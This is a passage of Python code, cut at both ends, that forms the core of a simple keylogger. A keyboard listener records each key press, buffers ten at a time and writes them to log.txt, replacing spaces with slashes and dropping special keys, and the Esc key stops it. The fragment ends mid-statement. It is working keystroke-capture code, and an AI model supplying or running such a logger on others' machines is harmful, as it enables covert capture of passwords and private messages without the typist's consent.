    if count >= 10:
        count=0
        write_file(keys)
        keys= []


def write_file(keys):
    with open("log.txt","w") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('/')
            elif k.find("Key") == -1:
                f.write(k)






def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
